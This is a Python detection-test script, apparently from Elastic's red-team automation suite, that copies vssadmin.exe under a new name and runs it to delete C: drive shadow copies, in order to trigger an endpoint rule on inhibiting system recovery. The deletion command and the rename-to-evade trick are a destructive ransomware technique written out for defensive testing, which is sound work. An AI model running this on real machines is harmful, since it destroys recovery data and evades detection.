# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import _common


@register_code_rta(
    id="5fe84989-d544-4a7b-9fbf-0e30d86c09ce",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        {
            "rule_name": "Inhibit System Recovery via Renamed Utilities",
            "rule_id": "153f52e2-2fe5-420b-8691-ddb8562b99d7",
        }
    ],
    siem_rules=[],
    techniques=["T1490", "T1218"],
)
def main():
    vssadmin = "C:\\Windows\\System32\\vssadmin.exe"
    ren_vssadmin = "C:\\Users\\Public\\renvssadmin.exe"

    _common.copy_file(vssadmin, ren_vssadmin)
    # Execute command
    _common.log("Deleting Shadow Copies using a renamed Vssadmin")
    _common.execute([ren_vssadmin, "delete", "shadows", "/For=C:"], timeout=10)
    _common.remove_file(ren_vssadmin)


